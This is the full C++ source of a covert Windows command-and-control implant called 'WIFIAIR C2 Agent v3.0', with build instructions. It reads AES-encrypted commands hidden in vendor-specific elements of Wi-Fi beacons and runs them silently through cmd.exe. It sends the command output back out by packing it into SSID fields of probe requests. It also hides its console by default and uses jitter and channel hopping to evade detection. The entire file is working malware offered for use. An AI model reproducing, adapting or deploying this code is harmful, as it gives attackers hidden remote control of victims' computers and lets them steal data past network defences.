/*
 * WIFIAIR C2 Agent v3.0 - Next Generation Covert Wi-Fi Agent
 * ===========================================================
 * Features:
 *   1. AES-256-CTR encryption via BCrypt (replaces RC4)
 *   2. ACK/retransmit protocol (reliable delivery)
 *   3. OUI derived from PSK (no static signatures)
 *   4. Channel hopping awareness
 *   5. Stealth by default (no console, CreateProcess with CREATE_NO_WINDOW)
 *   6. Job queue for outbound responses
 *
 * Stealth is the default. Use -debug for console output during testing.
 *
 * Build (Visual Studio):
 *   Open solution -> Build Release x64
 *
 * Build (MinGW):
 *   g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -lbcrypt -static
 */

#include <windows.h>
#include <wlanapi.h>
#include <bcrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <set>
#include <queue>
#include <algorithm>
#include <cstdio>
#include <ctime>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "bcrypt.lib")

// ============================================================================
//  PRE-SHARED KEY (AES-256 = 32 bytes) - MUST MATCH SERVER
// ============================================================================
static const BYTE PSK[32] = {
    0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF,
    0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01,
    0xA3, 0xB2, 0xC1, 0xD0, 0xE4, 0xF5, 0x06, 0x17,
    0x28, 0x39, 0x4A, 0x5B, 0x6C, 0x7D, 0x8E, 0x9F
};

// ============================================================================
//  MESSAGE TYPES & FLAGS (must match server)
// ============================================================================
static const BYTE MSG_CMD       = 0x01;
static const BYTE MSG_ACK       = 0x02;
static const BYTE MSG_RESPONSE  = 0x04;

static const BYTE FLAG_ENCRYPTED = 0x02;

// ============================================================================
//  CHANNEL HOPPING
// ============================================================================
static const int CHANNELS[]   = { 1, 6, 11 };
static const int NUM_CHANNELS = 3;
static const int HOP_INTERVAL = 10;

// ============================================================================
//  BASE64
// ============================================================================
static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// ============================================================================
//  GLOBAL STATE
// ============================================================================
BYTE   g_AgentId         = 0;
bool   g_ExfilEnabled    = false;
DWORD  g_ExfilDurationMs = 0;
DWORD  g_ExfilJitterMin  = 2500;
DWORD  g_ExfilJitterMax  = 3500;

// --- DEBUG MODE (off by default = stealth, use -debug for console output) ---
bool   g_DebugMode       = false;

// --- Session OUI (derived from PSK at startup) ---
BYTE   g_SessionOUI[3]   = { 0 };

// --- Channel hopping seed ---
unsigned int g_ChannelSeed = 0;

// --- Scan event ---
HANDLE g_hScanComplete = NULL;

// --- Job tracking ---
struct JobBuffer {
    unsigned short total_chunks;
    std::map<unsigned short, std::string> parts;
    DWORD timestamp;
};
std::map<unsigned short, JobBuffer> active_jobs;
std::set<unsigned short> completed_jobs;

// --- Exfil queue ---
struct ExfilJob {
    unsigned short jobId;
    std::string    output;
};
std::queue<ExfilJob> g_ExfilQueue;
bool g_IsExfilling = false;

// --- ACK tracking ---
std::set<unsigned short> g_AckedJobs;

// ============================================================================
//  LOGGING (only outputs when -debug is set)
// ============================================================================
#define LOG(msg) do { if (g_DebugMode) { std::cout << msg; } } while(0)
#define LOGLN(msg) do { if (g_DebugMode) { std::cout << msg << std::endl; } } while(0)
#define LOGFLUSH(msg) do { if (g_DebugMode) { std::cout << msg << std::flush; } } while(0)

// ============================================================================
//  UTILITY
// ============================================================================
DWORD Jitter(DWORD minMs, DWORD maxMs) {
    if (minMs >= maxMs) return minMs;
    return minMs + (rand() % (maxMs - minMs + 1));
}

// ============================================================================
//  SHA-256 via BCrypt
// ============================================================================
bool ComputeSHA256(const BYTE* data, size_t len, BYTE outHash[32]) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        return false;

    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BCryptHashData(hHash, (PUCHAR)data, (ULONG)len, 0);
    BCryptFinishHash(hHash, outHash, 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

// ============================================================================
//  DERIVE SESSION OUI & CHANNEL SEED FROM PSK
// ============================================================================
void DeriveSessionOUI() {
    const char* suffix = "WIFIAIR_OUI_V3";
    std::vector<BYTE> input(PSK, PSK + 32);
    input.insert(input.end(), (BYTE*)suffix, (BYTE*)suffix + strlen(suffix));
    BYTE hash[32];
    ComputeSHA256(input.data(), input.size(), hash);
    memcpy(g_SessionOUI, hash, 3);
}

void DeriveChannelSeed() {
    const char* suffix = "WIFIAIR_CHANNEL_HOP";
    std::vector<BYTE> input(PSK, PSK + 32);
    input.insert(input.end(), (BYTE*)suffix, (BYTE*)suffix + strlen(suffix));
    BYTE hash[32];
    ComputeSHA256(input.data(), input.size(), hash);
    g_ChannelSeed = ((unsigned int)hash[0] << 24) | ((unsigned int)hash[1] << 16) |
                    ((unsigned int)hash[2] << 8)  | (unsigned int)hash[3];
}

int GetCurrentChannel() {
    time_t now = time(NULL);
    unsigned int slot = (unsigned int)(now / HOP_INTERVAL);
    unsigned int h = (g_ChannelSeed + slot) * 2654435761u;
    return CHANNELS[h % NUM_CHANNELS];
}

// ============================================================================
//  RANDOM BYTES via BCrypt
// ============================================================================
bool GenerateRandom(BYTE* buffer, ULONG len) {
    return BCRYPT_SUCCESS(BCryptGenRandom(NULL, buffer, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG));
}

// ============================================================================
//  AES-256-CTR via BCrypt (ECB + manual counter)
// ============================================================================
bool AES256CTR_Process(const BYTE key[32], const BYTE nonce12[12], BYTE* data, size_t dataLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return false;

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    BYTE counter[16] = { 0 };
    memcpy(counter, nonce12, 12);

    BYTE keystream[16];
    ULONG cbResult;

    for (size_t offset = 0; offset < dataLen; offset += 16) {
        BYTE counterCopy[16];
        memcpy(counterCopy, counter, 16);

        BCryptEncrypt(hKey, counterCopy, 16, NULL, NULL, 0, keystream, 16, &cbResult, 0);

        size_t blockLen = min((size_t)16, dataLen - offset);
        for (size_t i = 0; i < blockLen; i++)
            data[offset + i] ^= keystream[i];

        for (int i = 15; i >= 12; i--) {
            if (++counter[i] != 0) break;
        }
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

std::vector<BYTE> AES256CTR_Encrypt(const BYTE key[32], const BYTE* plaintext, size_t len) {
    BYTE nonce[12];
    GenerateRandom(nonce, 12);
    std::vector<BYTE> result(12 + len);
    memcpy(result.data(), nonce, 12);
    memcpy(result.data() + 12, plaintext, len);
    AES256CTR_Process(key, nonce, result.data() + 12, len);
    return result;
}

std::vector<BYTE> AES256CTR_Decrypt(const BYTE key[32], const BYTE* data, size_t len) {
    if (len < 12) return {};
    BYTE nonce[12];
    memcpy(nonce, data, 12);
    size_t ctLen = len - 12;
    std::vector<BYTE> plaintext(ctLen);
    memcpy(plaintext.data(), data + 12, ctLen);
    AES256CTR_Process(key, nonce, plaintext.data(), ctLen);
    return plaintext;
}

// ============================================================================
//  BASE64
// ============================================================================
std::vector<BYTE> Base64Decode(const std::string& encoded) {
    std::vector<BYTE> ret;
    int i = 0, in_ = 0;
    int in_len = (int)encoded.size();
    BYTE ca4[4], ca3[3];
    while (in_len-- && (encoded[in_] != '=') &&
           (isalnum(encoded[in_]) || encoded[in_] == '+' || encoded[in_] == '/')) {
        ca4[i++] = encoded[in_++];
        if (i == 4) {
            for (i = 0; i < 4; i++) ca4[i] = (BYTE)base64_chars.find(ca4[i]);
            ca3[0] = (ca4[0] << 2) + ((ca4[1] & 0x30) >> 4);
            ca3[1] = ((ca4[1] & 0xf) << 4) + ((ca4[2] & 0x3c) >> 2);
            ca3[2] = ((ca4[2] & 0x3) << 6) + ca4[3];
            for (i = 0; i < 3; i++) ret.push_back(ca3[i]);
            i = 0;
        }
    }
    if (i) {
        for (int j = i; j < 4; j++) ca4[j] = 0;
        for (int j = 0; j < 4; j++) ca4[j] = (BYTE)base64_chars.find(ca4[j]);
        ca3[0] = (ca4[0] << 2) + ((ca4[1] & 0x30) >> 4);
        ca3[1] = ((ca4[1] & 0xf) << 4) + ((ca4[2] & 0x3c) >> 2);
        for (int j = 0; j < i - 1; j++) ret.push_back(ca3[j]);
    }
    return ret;
}

std::string Base64Encode(const std::vector<BYTE>& data) {
    std::string ret;
    int i = 0;
    BYTE ca3[3], ca4[4];
    size_t len = data.size();
    const BYTE* bytes = data.data();
    while (len--) {
        ca3[i++] = *(bytes++);
        if (i == 3) {
            ca4[0] = (ca3[0] & 0xfc) >> 2;
            ca4[1] = ((ca3[0] & 0x03) << 4) + ((ca3[1] & 0xf0) >> 4);
            ca4[2] = ((ca3[1] & 0x0f) << 2) + ((ca3[2] & 0xc0) >> 6);
            ca4[3] = ca3[2] & 0x3f;
            for (i = 0; i < 4; i++) ret += base64_chars[ca4[i]];
            i = 0;
        }
    }
    if (i) {
        for (int j = i; j < 3; j++) ca3[j] = '\0';
        ca4[0] = (ca3[0] & 0xfc) >> 2;
        ca4[1] = ((ca3[0] & 0x03) << 4) + ((ca3[1] & 0xf0) >> 4);
        ca4[2] = ((ca3[1] & 0x0f) << 2) + ((ca3[2] & 0xc0) >> 6);
        for (int j = 0; j < i + 1; j++) ret += base64_chars[ca4[j]];
        while (i++ < 3) ret += '=';
    }
    return ret;
}

// ============================================================================
//  COMMAND EXECUTION (always stealth: CreateProcess + CREATE_NO_WINDOW)
// ============================================================================
std::string ExecCommand(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return "ERROR: CreatePipe failed";

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = { 0 };
    std::string fullCmd = "cmd.exe /c " + cmd + " 2>&1";

    if (!CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "ERROR: CreateProcess failed";
    }

    CloseHandle(hWritePipe);

    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (result.empty()) result = "[No output]";
    return result;
}

// ============================================================================
//  SEND ACK PROBE (agent -> server)
// ============================================================================
void SendAckProbe(HANDLE hClient, GUID* pGuid, unsigned short jobId) {
    DOT11_SSID ssid = { 0 };
    ssid.ucSSID[0]  = g_SessionOUI[0];
    ssid.ucSSID[1]  = g_SessionOUI[1];
    ssid.ucSSID[2]  = g_SessionOUI[2];
    ssid.ucSSID[3]  = MSG_ACK;
    ssid.ucSSID[4]  = g_AgentId;
    ssid.ucSSID[5]  = (jobId >> 8) & 0xFF;
    ssid.ucSSID[6]  = jobId & 0xFF;
    ssid.ucSSID[7]  = 0x00; ssid.ucSSID[8]  = 0x01;
    ssid.ucSSID[9]  = 0x00; ssid.ucSSID[10] = 0x01;
    ssid.ucSSID[11] = 0x00;
    ssid.uSSIDLength = 12;

    for (int i = 0; i < 3; i++) {
        WlanScan(hClient, pGuid, &ssid, NULL, NULL);
        Sleep(Jitter(200, 500));
    }
    LOG("[+] ACK sent for Job 0x" << std::hex << jobId << std::dec << std::endl);
}

// ============================================================================
//  EXFIL: Prepare encrypted payload once (called once per job)
// ============================================================================
struct PreparedExfil {
    std::string b64;
    unsigned short total;
    BYTE flags;
};

PreparedExfil PrepareExfilPayload(const std::string& rawOutput) {
    PreparedExfil pe;
    std::vector<BYTE> toEncrypt(rawOutput.begin(), rawOutput.end());
    std::vector<BYTE> encrypted = AES256CTR_Encrypt(PSK, toEncrypt.data(), toEncrypt.size());
    pe.b64 = Base64Encode(encrypted);
    pe.flags = FLAG_ENCRYPTED;
    const size_t CHUNK_SIZE = 20;
    pe.total = (unsigned short)((pe.b64.size() + CHUNK_SIZE - 1) / CHUNK_SIZE);
    return pe;
}

// ============================================================================
//  EXFIL: Send one pass of all chunks (uses pre-encrypted payload)
// ============================================================================
static const int EXFIL_MAX_RETRIES = 3;
static const DWORD EXFIL_RETRY_DELAY = 3000;

void SendExfilSequence(HANDLE hClient, GUID* pGuid, unsigned short jobId,
                       const PreparedExfil& pe) {
    Sleep(1500);
    DWORD startTime = GetTickCount();

    const size_t CHUNK_SIZE = 20;

    LOG("[*] Exfil Job 0x" << std::hex << jobId << std::dec
        << ": " << pe.b64.size() << "B b64 (" << pe.total << " chunks)" << std::endl);

    for (int i = 0; i < (int)pe.total; i++) {
        if (g_ExfilDurationMs > 0 && (GetTickCount() - startTime > g_ExfilDurationMs))
            return;

        if (g_AckedJobs.count(jobId)) {
            LOG(std::endl << "[+] Server ACK received, stopping exfil for 0x"
                << std::hex << jobId << std::dec << std::endl);
            return;
        }

        unsigned short seq = (unsigned short)(i + 1);
        size_t start = i * CHUNK_SIZE;
        size_t len = min(CHUNK_SIZE, pe.b64.size() - start);
        std::string chunk = pe.b64.substr(start, len);

        DOT11_SSID ssid = { 0 };
        ssid.ucSSID[0]  = g_SessionOUI[0];
        ssid.ucSSID[1]  = g_SessionOUI[1];
        ssid.ucSSID[2]  = g_SessionOUI[2];
        ssid.ucSSID[3]  = MSG_RESPONSE;
        ssid.ucSSID[4]  = g_AgentId;
        ssid.ucSSID[5]  = (jobId >> 8) & 0xFF;
        ssid.ucSSID[6]  = jobId & 0xFF;
        ssid.ucSSID[7]  = (seq >> 8) & 0xFF;
        ssid.ucSSID[8]  = seq & 0xFF;
        ssid.ucSSID[9]  = (pe.total >> 8) & 0xFF;
        ssid.ucSSID[10] = pe.total & 0xFF;
        ssid.ucSSID[11] = pe.flags;
        memcpy(&ssid.ucSSID[12], chunk.c_str(), len);
        ssid.uSSIDLength = 12 + (ULONG)len;

        bool success = false;
        for (int retry = 0; retry < EXFIL_MAX_RETRIES && !success; retry++) {
            if (g_ExfilDurationMs > 0 && (GetTickCount() - startTime > g_ExfilDurationMs))
                return;
            DWORD result = WlanScan(hClient, pGuid, &ssid, NULL, NULL);
            if (result == ERROR_SUCCESS) {
                LOGFLUSH(".");
                success = true;
            } else {
                LOGFLUSH("!");
                if (retry < EXFIL_MAX_RETRIES - 1) Sleep(EXFIL_RETRY_DELAY);
            }
        }
        if (!success) LOGFLUSH("X");

        Sleep(Jitter(g_ExfilJitterMin, g_ExfilJitterMax));
    }

    LOG(" [DONE]" << std::endl);
    Sleep(Jitter(500, 1500));
}

// ============================================================================
//  PARSE VSE TAGS (v3.0 header: 12 bytes)
// ============================================================================
void ParseVSE(HANDLE hClient, GUID* pGuid, PBYTE pRawData, DWORD dwSize) {
    DWORD offset = 0;

    while (offset + 2 <= dwSize) {
        BYTE ieID = pRawData[offset];
        BYTE ieLen = pRawData[offset + 1];

        if (offset + 2 + ieLen > dwSize) break;

        PBYTE ieData = &pRawData[offset + 2];

        if (ieID == 221 && ieLen >= 12 &&
            memcmp(ieData, g_SessionOUI, 3) == 0) {

            BYTE msgType     = ieData[3];
            BYTE targetAgent = ieData[4];
            unsigned short jobId = (ieData[5] << 8) | ieData[6];
            unsigned short seq   = (ieData[7] << 8) | ieData[8];
            unsigned short total = (ieData[9] << 8) | ieData[10];
            BYTE flags           = ieData[11];

            // --- Handle ACK from server ---
            if (msgType == MSG_ACK) {
                if (targetAgent == g_AgentId || targetAgent == 0) {
                    if (g_AckedJobs.find(jobId) == g_AckedJobs.end()) {
                        g_AckedJobs.insert(jobId);
                        LOG("[+] Server ACK beacon for Job 0x" << std::hex << jobId
                            << std::dec << std::endl);
                    }
                }
                offset += (2 + ieLen);
                continue;
            }

            // --- Handle CMD ---
            if (msgType != MSG_CMD) {
                offset += (2 + ieLen);
                continue;
            }

            if (targetAgent != 0 && targetAgent != g_AgentId) {
                offset += (2 + ieLen);
                continue;
            }

            if (completed_jobs.count(jobId)) {
                offset += (2 + ieLen);
                continue;
            }

            std::string chunk((char*)(ieData + 12), ieLen - 12);

            JobBuffer& buf = active_jobs[jobId];
            buf.total_chunks = total;
            buf.timestamp = GetTickCount();

            if (buf.parts.find(seq) == buf.parts.end()) {
                buf.parts[seq] = chunk;

                if (buf.parts.size() == 1) {
                    if (targetAgent == 0)
                        LOG(std::endl << "[*] New Broadcast Job 0x" << std::hex << jobId
                            << std::dec << "..." << std::endl);
                    else
                        LOG(std::endl << "[*] New Job 0x" << std::hex << jobId << std::dec
                            << " (Target: Agent " << (int)targetAgent << ")" << std::endl);
                }
            }

            if (buf.parts.size() == total) {
                std::string full_b64;
                for (unsigned short i = 1; i <= total; i++) full_b64 += buf.parts[i];

                completed_jobs.insert(jobId);
                active_jobs.erase(jobId);

                try {
                    std::vector<BYTE> raw = Base64Decode(full_b64);
                    if (raw.empty()) throw std::runtime_error("Empty decode");

                    // Decrypt
                    std::vector<BYTE> plaintext;
                    if (flags & FLAG_ENCRYPTED) {
                        plaintext = AES256CTR_Decrypt(PSK, raw.data(), raw.size());
                    } else {
                        plaintext = raw;
                    }

                    std::string cmd(plaintext.begin(), plaintext.end());
                    LOG("[+] EXECUTE: " << cmd << std::endl);

                    // Send ACK only if upstream is enabled
                    if (g_ExfilEnabled) {
                        SendAckProbe(hClient, pGuid, jobId);
                    }

                    // Execute command (always stealth: CreateProcess + CREATE_NO_WINDOW)
                    std::string output = ExecCommand(cmd);
                    LOG("[+] OUTPUT (" << output.size() << " bytes):" << std::endl);
                    LOG(output << std::endl);

                    if (g_ExfilEnabled) {
                        ExfilJob ej;
                        ej.jobId = jobId;
                        ej.output = output;
                        g_ExfilQueue.push(ej);
                        LOG("[*] Queued response for exfil (queue: "
                            << g_ExfilQueue.size() << ")" << std::endl);
                    }

                } catch (...) {
                    LOG("[-] Decrypt error" << std::endl);
                }
            }
        }
        offset += (2 + ieLen);
    }
}

// ============================================================================
//  WLAN NOTIFICATION CALLBACK
// ============================================================================
VOID WINAPI WlanNotificationCallback(PWLAN_NOTIFICATION_DATA pData, PVOID pCtx) {
    if (pData != NULL &&
        pData->NotificationSource == WLAN_NOTIFICATION_SOURCE_ACM &&
        pData->NotificationCode == wlan_notification_acm_scan_complete) {
        SetEvent(g_hScanComplete);
    }
}

// ============================================================================
//  MAIN SCAN LOOP
// ============================================================================
void ScanLoop() {
    HANDLE hClient = NULL;
    DWORD dwVer = 0;

    if (WlanOpenHandle(2, NULL, &dwVer, &hClient) != ERROR_SUCCESS) {
        LOG("[-] Error: WlanOpenHandle failed" << std::endl);
        return;
    }

    g_hScanComplete = CreateEvent(NULL, FALSE, FALSE, NULL);
    WlanRegisterNotification(hClient, WLAN_NOTIFICATION_SOURCE_ACM, TRUE,
        (WLAN_NOTIFICATION_CALLBACK)WlanNotificationCallback, NULL, NULL, NULL);

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS || !pIfList ||
        pIfList->dwNumberOfItems == 0) {
        LOG("[-] Error: No Wi-Fi interfaces found" << std::endl);
        WlanCloseHandle(hClient, NULL);
        return;
    }

    GUID* pGuid = &pIfList->InterfaceInfo[0].InterfaceGuid;
    LOG("[+] Interface: ");
    if (g_DebugMode)
        std::wcout << pIfList->InterfaceInfo[0].strInterfaceDescription << std::endl;

    DWORD lastPrune = GetTickCount();

    while (true) {
        // --- Exfil mode: drain the queue ---
        if (g_ExfilEnabled && !g_ExfilQueue.empty()) {
            g_IsExfilling = true;

            while (!g_ExfilQueue.empty()) {
                ExfilJob ej = g_ExfilQueue.front();
                g_ExfilQueue.pop();

                LOGLN("[*] Exfiltrating Job 0x" << std::hex << ej.jobId << std::dec
                      << " (" << ej.output.size() << " bytes)...");

                // Encrypt ONCE — reuse same payload across all retransmit passes
                PreparedExfil pe = PrepareExfilPayload(ej.output);

                DWORD jobStart = GetTickCount();
                while (true) {
                    if (g_ExfilDurationMs > 0 &&
                        (GetTickCount() - jobStart > g_ExfilDurationMs))
                        break;
                    if (g_AckedJobs.count(ej.jobId))
                        break;
                    SendExfilSequence(hClient, pGuid, ej.jobId, pe);
                    if (g_AckedJobs.count(ej.jobId)) break;

                    // Quick scan between passes to check for server ACK beacon
                    WlanScan(hClient, pGuid, NULL, NULL, NULL);
                    WaitForSingleObject(g_hScanComplete, 500);
                    PWLAN_BSS_LIST pAckList = NULL;
                    if (WlanGetNetworkBssList(hClient, pGuid, NULL, dot11_BSS_type_any,
                                              FALSE, NULL, &pAckList) == ERROR_SUCCESS) {
                        for (DWORD a = 0; a < pAckList->dwNumberOfItems; a++) {
                            PWLAN_BSS_ENTRY pE = &pAckList->wlanBssEntries[a];
                            if (pE->ulIeSize > 0)
                                ParseVSE(hClient, pGuid,
                                         (PBYTE)pE + pE->ulIeOffset, pE->ulIeSize);
                        }
                        WlanFreeMemory(pAckList);
                    }
                    if (g_AckedJobs.count(ej.jobId)) {
                        LOGLN("[+] Server ACK received! Stopping exfil early.");
                        break;
                    }
                }
                LOGLN("[*] Exfil complete for Job 0x" << std::hex << ej.jobId << std::dec);
            }

            g_IsExfilling = false;
            LOGLN("[*] Exfil queue drained. Returning to scan mode.");
        }

        // --- Normal scan ---
        WlanScan(hClient, pGuid, NULL, NULL, NULL);
        WaitForSingleObject(g_hScanComplete, 500);

        PWLAN_BSS_LIST pBssList = NULL;
        if (WlanGetNetworkBssList(hClient, pGuid, NULL, dot11_BSS_type_any,
                                  FALSE, NULL, &pBssList) == ERROR_SUCCESS) {
            for (DWORD i = 0; i < pBssList->dwNumberOfItems; i++) {
                PWLAN_BSS_ENTRY pEntry = &pBssList->wlanBssEntries[i];
                if (pEntry->ulIeSize > 0)
                    ParseVSE(hClient, pGuid,
                             (PBYTE)pEntry + pEntry->ulIeOffset, pEntry->ulIeSize);
            }
            WlanFreeMemory(pBssList);
        }

        // --- Prune stale jobs (every 60s) ---
        if (GetTickCount() - lastPrune > 60000) {
            DWORD now = GetTickCount();
            std::vector<unsigned short> stale;
            for (auto& kv : active_jobs) {
                if (now - kv.second.timestamp > 120000)
                    stale.push_back(kv.first);
            }
            for (auto jid : stale) {
                active_jobs.erase(jid);
                LOG("[!] Pruned stale job 0x" << std::hex << jid << std::dec << std::endl);
            }
            if (completed_jobs.size() > 1000) completed_jobs.clear();
            if (g_AckedJobs.size() > 500) g_AckedJobs.clear();
            lastPrune = now;
        }
    }

    CloseHandle(g_hScanComplete);
    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
}

// ============================================================================
//  USAGE
// ============================================================================
void PrintUsage(const char* exe) {
    std::cout << "WIFIAIR Agent v3.0 - Next Generation Covert Wi-Fi C2 Agent\n\n"
        << "Usage: " << exe << " [options]\n\n"
        << "Options:\n"
        << "  -agent <id>          Agent ID (1-255, required)\n"
        << "  -exfil               Enable response exfiltration\n"
        << "  -duration <seconds>  Exfil broadcast duration per job\n"
        << "  -jitter <min> <max>  Exfil jitter in ms (default: 2500 3500)\n"
        << "  -debug               Enable console output for debugging\n"
        << "  -h                   Show this help\n\n"
        << "Examples:\n"
        << "  " << exe << " -agent 1\n"
        << "  " << exe << " -agent 2 -exfil -duration 60\n"
        << "  " << exe << " -agent 1 -exfil -duration 60 -debug\n"
        << "  " << exe << " -agent 1 -exfil -duration 120 -jitter 1000 3000\n\n"
        << "Default Behavior:\n"
        << "  - Stealth: no console window, no visible output\n"
        << "  - Commands executed via CreateProcess with CREATE_NO_WINDOW\n"
        << "  - Use -debug to see console output during testing\n\n"
        << "Encryption: AES-256-CTR (via Windows BCrypt)\n";
}

// ============================================================================
//  MAIN
// ============================================================================
int main(int argc, char* argv[]) {
    srand((unsigned int)GetTickCount());

    bool durationSet = false;
    bool agentSet = false;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-agent" && i + 1 < argc) {
            int id = std::stoi(argv[++i]);
            if (id < 1 || id > 255) {
                std::cerr << "[-] Error: Agent ID must be 1-255" << std::endl;
                return 1;
            }
            g_AgentId = (BYTE)id;
            agentSet = true;
        }
        else if (arg == "-exfil") {
            g_ExfilEnabled = true;
        }
        else if (arg == "-duration" && i + 1 < argc) {
            g_ExfilDurationMs = std::stoi(argv[++i]) * 1000;
            durationSet = true;
        }
        else if (arg == "-jitter" && i + 2 < argc) {
            g_ExfilJitterMin = std::stoi(argv[++i]);
            g_ExfilJitterMax = std::stoi(argv[++i]);
            if (g_ExfilJitterMin > g_ExfilJitterMax)
                std::swap(g_ExfilJitterMin, g_ExfilJitterMax);
        }
        else if (arg == "-debug") {
            g_DebugMode = true;
        }
        else if (arg == "-h" || arg == "--help") {
            PrintUsage(argv[0]);
            return 0;
        }
    }

    if (g_ExfilEnabled && !durationSet) {
        std::cerr << "[-] Error: -exfil requires -duration <seconds>" << std::endl;
        PrintUsage(argv[0]);
        return 1;
    }

    DeriveSessionOUI();
    DeriveChannelSeed();

    // Stealth by default: hide console unless -debug
    if (!g_DebugMode) {
        FreeConsole();
    }

    LOG(R"(
 __        _____ _____ ___    _    ___ ____
 \ \      / /_ _|  ___|_ _|  / \  |_ _|  _ \
  \ \ /\ / / | || |_   | |  / _ \  | || |_) |
   \ V  V /  | ||  _|  | | / ___ \ | ||  _ <
    \_/\_/  |___|_|   |___/_/   \_\___|_| \_\
)" << std::endl);

    LOGLN("[*] WIFIAIR Agent v3.0 (Next-Gen)");
    LOGLN("[*] Encryption  : AES-256-CTR (BCrypt)");

    char ouiStr[16];
    snprintf(ouiStr, sizeof(ouiStr), "%02x:%02x:%02x",
             g_SessionOUI[0], g_SessionOUI[1], g_SessionOUI[2]);
    LOGLN("[*] Session OUI : " << ouiStr << " (derived from PSK)");
    LOGLN("[*] Channel Seed: 0x" << std::hex << g_ChannelSeed << std::dec);
    LOGLN("[*] Current Chan: " << GetCurrentChannel());
    LOGLN("[*] Debug       : ON");

    if (agentSet) {
        LOGLN("[*] Agent ID    : " << (int)g_AgentId);
    } else {
        LOGLN("[!] WARNING: No agent ID set - will receive ALL commands");
        LOGLN("[!] Use -agent <id> for a unique ID");
    }

    if (g_ExfilEnabled) {
        LOGLN("[*] Exfil       : ENABLED (Duration: " << (g_ExfilDurationMs / 1000)
              << "s, Jitter: " << g_ExfilJitterMin << "-" << g_ExfilJitterMax << "ms)");
        LOGLN("[*] Mode        : BIDIRECTIONAL (upstream: ACK + exfil)");
    } else {
        LOGLN("[*] Exfil       : DISABLED");
        LOGLN("[*] Mode        : RECEIVE-ONLY (zero upstream traffic)");
    }

    LOGLN("[*] Listening for commands...");

    ScanLoop();
    return 0;
}
